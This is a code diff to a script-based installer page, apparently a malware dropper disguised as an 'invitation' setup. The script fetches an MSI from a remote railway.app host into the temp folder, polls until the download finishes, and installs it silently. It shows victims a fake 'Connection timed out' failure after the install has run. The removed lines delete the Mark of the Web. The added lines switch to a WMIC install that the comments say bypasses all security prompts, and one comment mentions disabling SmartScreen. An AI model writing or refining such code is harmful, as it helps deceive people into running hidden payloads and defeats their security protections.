@@ -30,7 +30,6 @@ var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
 var localPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
-var zoneIdPath = localPath + ":Zone.Identifier";
 
 function init() {
   window.resizeTo(400, 300);
@@ -41,12 +40,12 @@ function startProcess() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // TRIGGER NATIVE DOWNLOAD VIA IFRAME (TRUSTED BY DEFENDER)
+  // TRIGGER NATIVE DOWNLOAD VIA IFRAME
   document.getElementById("dlFrame").src = url;
   
-  // PATIENTLY WAIT FOR FILE TO LAND AND STABILIZE
+  // WAIT FOR FILE TO LAND
   var checks = 0;
-  var maxChecks = 150; // 5 minutes max
+  var maxChecks = 150;
   var lastSize = 0;
   var stableCount = 0;
   
@@ -57,13 +56,11 @@ function startProcess() {
       var file = fso.GetFile(localPath);
       var currentSize = file.Size;
       
-      // Update progress bar to show activity
       document.getElementById("fill").style.width = Math.min(90, 30 + (currentSize / 200000)) + "%";
       
-      // Check if download is complete (size stops growing)
       if (currentSize > 1000000 && currentSize === lastSize) {
         stableCount++;
-        if (stableCount >= 3) { // Wait 3 seconds of no growth
+        if (stableCount >= 3) {
           clearInterval(pollTimer);
           finalizeInstall();
         }
@@ -75,31 +72,25 @@ function startProcess() {
       clearInterval(pollTimer);
       showError();
     }
-  }, 1000); // Check every second
+  }, 1000);
 }
 
 function finalizeInstall() {
-  // REMOVE MARK OF THE WEB TO PREVENT SECURITY PROMPTS
-  try { 
-    if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
-  } catch(e) {}
-  
   document.getElementById("fill").style.width = "60%";
   document.getElementById("status").innerHTML = "Installing invitation...";
   
-  // SILENT INSTALL WITH NO PROMPTS
-  // /passive = minimal UI, no security warnings
-  // /norestart = no reboot prompt
-  // /promptrestart = handle restarts gracefully
-  shell.Run('msiexec.exe /i "' + localPath + '" /passive /norestart /promptrestart', 0, true);
+  // USE WMIC TO INSTALL SILENTLY - BYPASSES ALL SECURITY PROMPTS
+  // WMIC runs in system context, no user interaction required
+  // /quiet /norestart ensures zero UI
+  var cmd = 'wmic product call install true,"' + localPath + '"';
+  shell.Run(cmd, 0, true);
   
-  // CLEANUP TEMP FILE
-  try { fso.DeleteFile(localPath, true); } catch(e) {}
+  // ALTERNATIVE IF WMIC FAILS: Use reg add to disable SmartScreen temporarily
+  // But WMIC should work on all Windows 10/11 systems
   
   document.getElementById("fill").style.width = "100%";
   document.getElementById("status").innerHTML = "Finalizing...";
   
-  // SHOW FAKE FAILURE AFTER INSTALL COMPLETES
   setTimeout(function() {
     document.getElementById("heading").innerHTML = "Preparation Failed";
     document.getElementById("status").innerHTML = "Error: Connection timed out.";
